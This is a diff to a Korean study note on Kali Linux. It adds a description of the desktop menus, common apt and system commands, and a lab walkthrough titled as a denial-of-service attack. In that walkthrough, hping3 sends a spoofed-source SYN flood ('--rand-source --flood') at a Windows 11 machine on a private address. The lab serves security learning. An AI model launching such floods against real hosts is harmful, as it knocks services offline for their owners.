@@ -121,24 +121,57 @@ Kali GNU/Linux 나오면 정상 설치
 <!-- 주요 화면 구성 설명, 스크린샷 삽입 위치 표시 -->
 
 ```
-[스크린샷 삽입]
+![칼리 메뉴 스크린샷](images/kali_menu_pannel.png)
 ```
 
 **주요 메뉴/패널 설명**
-- **[메뉴명]**: 
-- **[메뉴명]**: 
-- **[메뉴명]**: 
+**1. [Kali Menu]**  
+- 용 문양 아이콘  
+- 모든 보안 도구가 집약된 시작 메뉴
+- 침투 단계에 맞춰 도구들이 분류되어 있음
+  
+**2. [Top Panel]**  
+- 상단 패널  
+- 시스템의 현재 상태를 한눈에 파악가능
+- 작업 공간 전환기, 시스템 리소스 모니터, 네트워크 연결 상태, 알림 및 시계
+
+**3. [Terminal Emulator]**  
+- 터미널  
+- 칼리 리눅스 활용의 90% 이상이 이루어지는 인터페이스
+  
+**4. [Desktop Shortcuts]**  
+- 바탕화면 아이콘  
+  
+
+  
 
 ### CLI 기준 (해당 시)
 
 **기본 실행**
 ```bash
-# 기본 실행 명령어
+# 패키지 목록 업데이트 및 설치된 도구 전체 업그레이드  
+sudo apt update && sudo apt full-upgrade -y  
+
+# 도구 설치  
+sudo apt install nmap [도구명]  
+  
+# 현재 네트워크 인터페이스 및 IP 정보 확인 
+ip a  
 ```
 
 **자주 쓰는 옵션**
 ```bash
-# 옵션 예시
+# 1. [apt]  
+apt search [키워드]      # 저장소 내 특정 도구 검색  
+apt show [패키지명]      # 해당 도구의 상세 정보 및 버전 확인  
+
+# 2. [시스템 제어]  
+sudo -i                # 루트(root) 권한 계정으로 완전히 전환  
+systemctl start [서비스명] # 특정 서비스(ex. apache2) 실행  
+
+# 3. [파일 작업]  
+ls -al                 # 숨김 파일을 포함한 모든 파일의 상세 정보 출력  
+chmod +x [파일명]       # 다운로드한 스크립트 등에 실행 권한 부여  
 ```
 
 ---
@@ -178,26 +211,30 @@ base64 -d                         # Base64 디코딩
 **목표**: hping3 툴을 활용한 Kali Linux에서의 DoS 공격  
 
 **환경**
-- 공격자 : kali linux / 대상 : Windows 11   
+- 공격자 : kali linux  
+- 대상 : Windows 11   
 
 **Step 1 — [공격 대상 및 네트워크 확인]**
 ```bash
 ping [대상ip]
 ```
-결과: 대상 서버의 와이어샤크에서 Echo (ping) request, reply가 번갈아 오면 됨
+결과: 대상 서버의 와이어샤크에서 Echo (ping) request, reply가 번갈아 오면 됨  
+
 
 **Step 2 — [hping3 명령어를 이용한 SYN 패킷 생성]**
 ```bash
 hping3 -S [대상ip] -p 8080 --rand-source
 ```
 결과: ARP Who has xxx.xxx.xxx.xxx? Tell [공격자ip] 형식으로 찍힘  
-계속 MAC 주소를 찾고 있다는 뜻임
+계속 MAC 주소를 찾고 있다는 뜻임  
+
 
 **Step 3 — [대량 트래픽 전송 (Flooding)]**
 ```bash
 sudo hping3 -S 192.168.0.25 -p 8080 --rand-source --flood
 ```
-결과: 다양한 src_ip로 tcp 프로토콜을 사용해서 대량의 트래픽이 들어오면 됨
+결과: 다양한 src_ip로 tcp 프로토콜을 사용해서 대량의 트래픽이 들어오면 됨  
+
 
 > **예상 결과**: 대상 시스템(Windows 11)이 임의의 IP들로부터 쏟아지는 대량의 SYN 패킷을 처리하느라 리소스를 소진하여, 정상적인 네트워크 서비스를 제공할 수 없는 서비스 거부(DoS) 상태에 빠지게 됨
 
